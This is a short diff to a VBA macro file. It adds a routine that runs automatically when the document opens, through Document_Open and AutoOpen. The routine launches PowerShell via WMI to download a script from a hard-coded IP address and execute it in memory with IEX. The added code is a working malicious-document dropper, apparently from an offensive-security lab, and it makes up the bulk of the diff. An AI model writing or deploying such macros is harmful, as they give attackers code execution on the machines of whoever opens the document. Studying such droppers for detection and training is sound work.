@@ -57,3 +57,21 @@ Sub Wait(n As Long)
         DoEvents
     Loop Until Now >= DateAdd("s", n, t)
 End Sub
+
+' -----------------
+Sub MyMacro()
+    Dim str As String
+    
+    str = "powershell (New-Object System.Net.WebClient).DownloadString('http://192.168.45.151/run.txt') | IEX"
+
+    GetObject("winmgmts:").Get("Win32_Process").Create str, Null, Null, pid
+   
+End Sub
+
+Sub Document_Open()
+    MyMacro
+End Sub
+
+Sub AutoOpen()
+    MyMacro
+End Sub
